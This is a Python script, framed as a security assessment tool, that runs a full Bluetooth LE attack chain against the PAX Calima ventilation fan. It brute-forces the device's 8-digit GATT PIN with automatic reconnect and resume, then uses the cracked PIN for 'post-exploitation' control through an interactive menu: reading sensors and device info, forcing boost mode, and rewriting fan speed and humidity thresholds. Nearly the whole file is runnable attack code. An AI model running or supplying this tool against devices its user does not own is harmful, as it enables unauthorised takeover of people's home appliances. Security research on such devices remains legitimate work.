#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║        PAX CALIMA — FULL ATTACK CHAIN (Security Assessment)          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  Phase 1: Brute-force attack on the BLE PIN (uint32 LE, 8 digits)   ║
║  Phase 2: Full control of the device (post-exploitation)             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import struct
import math
import time
from bleak import BleakClient, BleakScanner, BleakError

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

TARGET = "XX:XX:XX:XX:XX:XX"  # ← Replace with your PAX Calima BLE MAC address

# BLE GATT Characteristic UUIDs (sourced from pycalima reverse engineering)
CHAR_PIN_CODE = "4cad343a-209a-40b7-b911-4d9b3df569b2"
CHAR_PIN_CONFIRMATION = "d1ae6b70-ee12-4f6d-b166-d2063dcaffe1"
CHAR_SENSOR_DATA = "528b80e8-c47a-4c0a-bdf1-916a7748f412"
CHAR_FAN_SPEED = "faa49e09-a79c-4725-b197-bdc57c67dc32"
CHAR_BOOST = "1488a757-35bc-4ec8-9a6b-9ecf1502778e"
CHAR_SENSITIVITY = "e782e131-6ce1-4191-a8db-f4304d7610f1"
CHAR_MODE = "b5836b55-57bd-433e-8480-46e4993c5ac0"
CHAR_MANUFACTURER = "00002a29-0000-1000-8000-00805f9b34fb"
CHAR_MODEL_NUMBER = "00002a24-0000-1000-8000-00805f9b34fb"
CHAR_FIRMWARE_REV = "00002a26-0000-1000-8000-00805f9b34fb"
CHAR_HARDWARE_REV = "00002a27-0000-1000-8000-00805f9b34fb"
CHAR_SOFTWARE_REV = "00002a28-0000-1000-8000-00805f9b34fb"

# Brute-force parameters
PIN_MIN = 0
PIN_MAX = 99999999
PROGRESS_INTERVAL = 100
CONNECTION_TIMEOUT = 30.0
ATTEMPT_DELAY = 0.05
RECONNECT_DELAY = 2.0
MAX_RECONNECT_ATTEMPTS = 10


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: BRUTE-FORCE
# ═══════════════════════════════════════════════════════════════════════

async def try_pin(client, pin_int):
    """
    Tries a single PIN against the device.
    Sends the PIN as a uint32 little-endian value and reads back the confirmation.

    Returns:
        True if the PIN is correct (confirmation != 0), False otherwise.
    """
    pin_bytes = struct.pack("<I", pin_int)
    await client.write_gatt_char(CHAR_PIN_CODE, pin_bytes)
    confirmation = await client.read_gatt_char(CHAR_PIN_CONFIRMATION)
    return any(b != 0 for b in confirmation)


async def connect_with_retry(max_attempts=MAX_RECONNECT_ATTEMPTS):
    """
    Connects to the BLE device with a retry mechanism.
    Handles disconnections typical of low-cost BLE devices.
    """
    for attempt in range(1, max_attempts + 1):
        try:
            print(f"  🔗 Connection attempt {attempt}/{max_attempts}...")
            client = BleakClient(TARGET, timeout=CONNECTION_TIMEOUT)
            await client.connect()
            if client.is_connected:
                print(f"  ✅ Connected!")
                return client
        except (BleakError, asyncio.TimeoutError, OSError) as e:
            print(f"  ⚠ Connection failed: {e}")
            if attempt < max_attempts:
                print(f"  Waiting {RECONNECT_DELAY} seconds before retrying...")
                await asyncio.sleep(RECONNECT_DELAY)
    return None


def format_time(seconds):
    """Formats seconds into a human-readable string (s / min / hours / days)."""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f} min"
    elif seconds < 86400:
        return f"{seconds/3600:.1f} hours"
    else:
        return f"{seconds/86400:.1f} days"


def format_pin(pin_int):
    """Formats the PIN as a zero-padded 8-digit string."""
    return f"{pin_int:08d}"


async def brute_force(start_offset=0):
    """
    Phase 1: PIN brute-force.
    Sequentially tries all PINs from start_offset up to 99999999.

    Returns:
        The discovered PIN (int) or None if not found.
    """
    print("\n" + "═" * 62)
    print("║  PHASE 1: BRUTE-FORCE PIN                                    ║")
    print("═" * 62)
    print(f"  Target:      {TARGET}")
    print(f"  Range:       {format_pin(start_offset)} → {format_pin(PIN_MAX)}")
    print(f"  PINs to try: {PIN_MAX - start_offset + 1:,}")
    print("═" * 62)

    # Initial connection
    print("\n  Connecting to device...")
    client = await connect_with_retry()
    if not client:
        print("  Unable to connect. Aborting.")
        return None

    # Statistics
    total_attempts = 0
    start_time = time.time()
    pin_found = None
    current_pin = start_offset

    print(f"\n🔓 Starting brute-force attack from PIN {format_pin(start_offset)}...")
    print(f"   Progress reported every {PROGRESS_INTERVAL} attempts\n")

    try:
        while current_pin <= PIN_MAX:
            # Check connection
            if not client.is_connected:
                print(f"\n  Disconnected! Last PIN tried: {format_pin(current_pin - 1)}")
                print(f"  Attempting reconnection...")
                await asyncio.sleep(RECONNECT_DELAY)
                client = await connect_with_retry()
                if not client:
                    print(f"\n  Reconnection failed. Resume from offset {current_pin}")
                    break
                print(f"  Resuming from PIN {format_pin(current_pin)}\n")

            # PIN attempt
            try:
                success = await try_pin(client, current_pin)
                total_attempts += 1

                if success:
                    elapsed = time.time() - start_time
                    pin_found = current_pin
                    print(f"\n  ✅ PIN FOUND: {format_pin(pin_found)}")
                    print(f"  Time elapsed: {format_time(elapsed)}")
                    print(f"  Total attempts: {total_attempts:,}")
                    print(f"  Speed: {total_attempts/elapsed:.1f} attempts/s")
                    print("\n" + "🎉" * 20)
                    break

                # Print progress
                if total_attempts % PROGRESS_INTERVAL == 0:
                    elapsed = time.time() - start_time
                    rate = total_attempts / elapsed if elapsed > 0 else 0
                    remaining = PIN_MAX - current_pin
                    eta = remaining / rate if rate > 0 else float('inf')
                    pct = ((current_pin - start_offset) / (PIN_MAX - start_offset + 1)) * 100
                    print(f"  [{pct:6.3f}%] PIN: {format_pin(current_pin)} | "
                          f"Attempts: {total_attempts:,} | "
                          f"Speed: {rate:.1f}/s | ETA: {format_time(eta)}")

                current_pin += 1
                if ATTEMPT_DELAY > 0:
                    await asyncio.sleep(ATTEMPT_DELAY)

            except (BleakError, asyncio.TimeoutError, OSError) as e:
                print(f"\n  BLE error at PIN {format_pin(current_pin)}: {e}")
                try:
                    await client.disconnect()
                except Exception:
                    pass
                client = BleakClient(TARGET, timeout=CONNECTION_TIMEOUT)
                continue

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n\n  Interrupted! Last PIN tried: {format_pin(current_pin)}")
        print(f"  To resume, use offset: {current_pin}")
        print(f"  Attempts: {total_attempts:,} | Time: {format_time(elapsed)}")

    finally:
        try:
            if client and client.is_connected:
                await client.disconnect()
                print("  Disconnected.")
        except Exception:
            pass

    # Summary
    elapsed = time.time() - start_time
    print("\n" + "─" * 62)
    print("  BRUTE-FORCE SUMMARY")
    print("─" * 62)
    print(f"  PIN found:       {'YES → ' + format_pin(pin_found) if pin_found is not None else 'NO'}")
    print(f"  Total attempts:  {total_attempts:,}")
    print(f"  Total time:      {format_time(elapsed)}")
    if total_attempts > 0 and elapsed > 0:
        rate = total_attempts / elapsed
        print(f"  Average speed:   {rate:.1f} attempts/s")
        print(f"  Estimated time for a full brute-force: {format_time((PIN_MAX + 1) / rate)}")
    print("─" * 62)

    return pin_found


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: POST-EXPLOITATION (REMOTE CONTROL)
# ═══════════════════════════════════════════════════════════════════════

def parse_sensor_data(data):
    """
    Decodes the 12 bytes of PAX Calima sensor data.
    Struct format: '<4HBHB'
      - Humidity (raw) → log2(val) * 10 = percentage
      - Temperature (raw) → val / 4 = °C
      - Light (lux)
      - Fan speed (RPM)
      - Mode byte (active trigger)
      - Extra short
      - Extra byte
    """
    if len(data) < 12:
        print(f"  Sensor data too short: {len(data)} bytes")
        return None

    values = struct.unpack('<4HBHB', data)
    humidity_raw = values[0]
    temp_raw = values[1]
    light = values[2]
    fan_speed = values[3]
    mode_byte = values[4]
    extra_short = values[5]
    extra_byte = values[6]

    humidity = round(math.log2(humidity_raw) * 10, 1) if humidity_raw > 0 else 0.0
    temperature = temp_raw / 4.0

    mode_names = {
        0x00: "Off / Idle",
        0x01: "Humidity",
        0x02: "Light",
        0x03: "Boost (manual)",
        0x04: "Timer",
        0xcb: "Active (combined)",
    }
    mode_str = mode_names.get(mode_byte, f"Unknown (0x{mode_byte:02x})")

    return {
        "humidity_raw": humidity_raw, "humidity": humidity,
        "temp_raw": temp_raw, "temperature": temperature,
        "light": light, "fan_speed": fan_speed,
        "mode_byte": mode_byte, "mode_str": mode_str,
        "extra_short": extra_short, "extra_byte": extra_byte,
    }


def print_sensor_info(parsed):
    """Prints a formatted summary of the sensor status."""
    print("\n╔══════════════════════════════════════╗")
    print("║       PAX CALIMA — SENSOR STATUS       ║")
    print("╠══════════════════════════════════════╣")
    print(f"║  Temperature: {parsed['temperature']:.1f}°C")
    print(f"║  Humidity:    {parsed['humidity']:.1f}%")
    print(f"║  Light:       {parsed['light']} lux")
    print(f"║  Fan:         {parsed['fan_speed']} RPM")
    print(f"║  Mode:        {parsed['mode_str']}")
    print("╚══════════════════════════════════════╝")


async def read_sensor_status(client):
    """Reads and displays sensor data from the device."""
    data = await client.read_gatt_char(CHAR_SENSOR_DATA)
    print(f"\n  Raw ({len(data)} bytes): {data.hex()}")
    parsed = parse_sensor_data(data)
    if parsed:
        print_sensor_info(parsed)
    return parsed


async def read_fan_speed_settings(client):
    """Reads the current fan speed settings."""
    try:
        data = await client.read_gatt_char(CHAR_FAN_SPEED)
        print(f"\n  Fan speed data ({len(data)} bytes): {data.hex()}")
        if len(data) >= 2:
            print(f"  Speed: {struct.unpack_from('<H', data, 0)[0]} RPM")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


async def activate_boost(client):
    """Activates boost mode with a custom speed and duration."""
    print("\n--- BOOST ACTIVATION ---")
    try:
        speed = int(input("  Speed (RPM, e.g. 2400): ") or "2400")
        seconds = int(input("  Duration (seconds, e.g. 300): ") or "300")
    except ValueError:
        speed, seconds = 2400, 300

    payload = struct.pack("<BHH", 1, speed, seconds)
    print(f"  Payload: {payload.hex()}")
    try:
        await client.write_gatt_char(CHAR_BOOST, payload)
        print(f"  Boost activated: {speed} RPM for {seconds}s")
    except Exception as e:
        print(f"  Error: {e}")


async def deactivate_boost(client):
    """Deactivates boost mode."""
    payload = struct.pack("<BHH", 0, 0, 0)
    try:
        await client.write_gatt_char(CHAR_BOOST, payload)
        print("  Boost deactivated.")
    except Exception as e:
        print(f"  ❌ Error: {e}")


async def set_fan_speed_levels(client):
    """Sets the humidity-based speed thresholds."""
    print("\n--- SPEED SETTINGS ---")
    try:
        threshold = int(input("  Humidity threshold (%): ") or "75")
        high = int(input("  HIGH speed (RPM): ") or "2400")
        medium = int(input("  MEDIUM speed (RPM): ") or "1600")
        low = int(input("  LOW speed (RPM): ") or "800")
    except ValueError:
        print("  Invalid values.")
        return

    payload = struct.pack("<4H", threshold, high, medium, low)
    try:
        await client.write_gatt_char(CHAR_SENSITIVITY, payload)
        print("  Speed levels set successfully.")
    except Exception as e:
        print(f"  Error: {e}")


async def read_sensitivity(client):
    """Reads the current sensitivity / speed threshold settings."""
    try:
        data = await client.read_gatt_char(CHAR_SENSITIVITY)
        if len(data) >= 8:
            v = struct.unpack('<4H', data[:8])
            print(f"\n  Humidity threshold: {v[0]}%")
            print(f"  High: {v[1]} RPM | Medium: {v[2]} RPM | Low: {v[3]} RPM")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


async def read_mode(client):
    """Reads the current operating mode."""
    try:
        data = await client.read_gatt_char(CHAR_MODE)
        print(f"\n  Mode ({len(data)} bytes): {data.hex()}")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


async def read_device_info(client):
    """Reads device information from the Device Information Service (0x180A)."""
    print("\n╔══════════════════════════════════════╗")
    print("║         DEVICE INFORMATION           ║")
    print("╠══════════════════════════════════════╣")
    for uuid, name in [
        (CHAR_MANUFACTURER, "Vendor"),
        (CHAR_MODEL_NUMBER, "Model"),
        (CHAR_FIRMWARE_REV, "Firmware"),
        (CHAR_HARDWARE_REV, "Hardware"),
        (CHAR_SOFTWARE_REV, "Software"),
    ]:
        try:
            data = await client.read_gatt_char(uuid)
            try:
                value = data.decode('utf-8').strip('\x00')
            except UnicodeDecodeError:
                value = data.hex()
            print(f"║  {name:12s}: {value}")
        except Exception:
            print(f"║  {name:12s}: (N/A)")
    print("╚══════════════════════════════════════╝")


async def read_boost_status(client):
    """Reads the current boost status."""
    try:
        data = await client.read_gatt_char(CHAR_BOOST)
        if len(data) >= 5:
            v = struct.unpack('<BHH', data[:5])
            print(f"\n  Boost: {'ACTIVE' if v[0] else 'OFF'}")
            print(f"  Speed: {v[1]} RPM | Remaining time: {v[2]}s")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


def print_menu():
    """Prints the interactive post-exploitation control menu."""
    print("\n┌─────────────────────────────────────┐")
    print("│    CALIMA CONTROL MENU               │")
    print("├──────────────────────────────────────┤")
    print("│  1) Read sensor status               │")
    print("│  2) Activate boost                   │")
    print("│  3) Turn off boost                   │")
    print("│  4) Set speed levels                 │")
    #print("│  5) Read sensitivity settings        │")
    print("│  5) Read boost status                │")
    #print("│  7) Read operating mode              │")
    print("│  6) Device info                      │")
    #print("│  7) Read fan speed settings          │")
    print("│  0) Disconnect and exit              │")
    print("└──────────────────────────────────────┘")


async def post_exploitation(pin_code):
    """
    Phase 2: Authenticated connection and interactive control.
    Uses the PIN discovered in Phase 1 to authenticate and control the device.
    """
    print("\n" + "═" * 62)
    print("║  PHASE 2: POST-EXPLOITATION (REMOTE CONTROL)                ║")
    print("═" * 62)
    print(f"  Target: {TARGET}")
    print(f"  PIN:    {format_pin(pin_code)}")
    print("═" * 62)

    print("\n  Connecting for post-exploitation...")

    async with BleakClient(TARGET, timeout=CONNECTION_TIMEOUT) as client:
        print("  Connected!")
        print(f"  Services discovered: {len(client.services.services)}")

        # Authenticate with the discovered PIN
        print("\n--- AUTHENTICATION ---")
        pin_bytes = struct.pack("<I", pin_code)
        print(f"  Sending PIN: {format_pin(pin_code)} → {pin_bytes.hex()}")
        await client.write_gatt_char(CHAR_PIN_CODE, pin_bytes)

        confirmation = await client.read_gatt_char(CHAR_PIN_CONFIRMATION)
        if any(b != 0 for b in confirmation):
            print("  Authentication SUCCESSFUL — full access granted!")
        else:
            print("  Authentication failed.")
            return

        # Interactive control menu
        while True:
            print_menu()
            try:
                choice = input("\n  Choice: ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n\n  Interrupted.")
                break

            if choice == "1":
                await read_sensor_status(client)
            elif choice == "2":
                await activate_boost(client)
            elif choice == "3":
                await deactivate_boost(client)
            elif choice == "4":
                await set_fan_speed_levels(client)
            #elif choice == "5":
                #await read_sensitivity(client)
            elif choice == "5":
                await read_boost_status(client)
            #elif choice == "7":
                #await read_mode(client)
            elif choice == "6":
                await read_device_info(client)
            #elif choice == "7":
                #await read_fan_speed_settings(client)
            elif choice == "0":
                print("\n  Disconnecting...")
                break
            else:
                print("  Invalid choice.")

    print("\n  Offline. Assessment completed.")


# ═══════════════════════════════════════════════════════════════════════
# MAIN — ATTACK CHAIN ORCHESTRATION
# ═══════════════════════════════════════════════════════════════════════

async def main():
    """
    Main entry point.
    Orchestrates the full attack chain: Brute-Force → Post-Exploitation.
    """
    print("\n╔══════════════════════════════════════════════════════════════╗")
    print("║     PAX CALIMA — FULL BLE ATTACK CHAIN                      ║")
    print("║     Security Assessment Tool                                 ║")
    print("╠══════════════════════════════════════════════════════════════╣")
    print("║  Attack:  PIN Brute-Force → Authenticated Control           ║")
    print("║  Method:  BLE GATT Write (uint32 LE) + Read Confirmation    ║")
    print("╚══════════════════════════════════════════════════════════════╝")

    print("\n  Select mode:")
    print("  [1] Full attack chain (brute-force + remote control)")
    print("  [2] Brute-force only")
    print("  [3] Remote control only (known PIN)")

    try:
        mode = input("\n  Mode [1]: ").strip() or "1"
    except (EOFError, KeyboardInterrupt):
        print("\n  Exit.")
        return

    if mode == "1":
        # FULL CHAIN: brute-force then remote control
        try:
            offset_input = input("  Brute-force start offset [0]: ").strip() or "0"
            start_offset = int(offset_input)
        except (ValueError, EOFError, KeyboardInterrupt):
            start_offset = 0

        pin_found = await brute_force(start_offset)

        if pin_found is not None:
            print(f"\n\n🎯 PIN cracked: {format_pin(pin_found)}")
            try:
                proceed = input("  Proceed with post-exploitation? [Y/n]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                proceed = "n"

            if proceed != "n":
                await post_exploitation(pin_found)
        else:
            print("\n  PIN not found. Attack chain aborted.")

    elif mode == "2":
        # BRUTE-FORCE ONLY
        try:
            offset_input = input("  Start offset [0]: ").strip() or "0"
            start_offset = int(offset_input)
        except (ValueError, EOFError, KeyboardInterrupt):
            start_offset = 0

        await brute_force(start_offset)

    elif mode == "3":
        # REMOTE CONTROL WITH KNOWN PIN
        try:
            pin_input = input("  Enter PIN (8 digits): ").strip()
            pin_code = int(pin_input)
        except (ValueError, EOFError, KeyboardInterrupt):
            print("  Invalid PIN.")
            return

        await post_exploitation(pin_code)

    else:
        print("  Invalid mode.")


if __name__ == "__main__":
    asyncio.run(main())
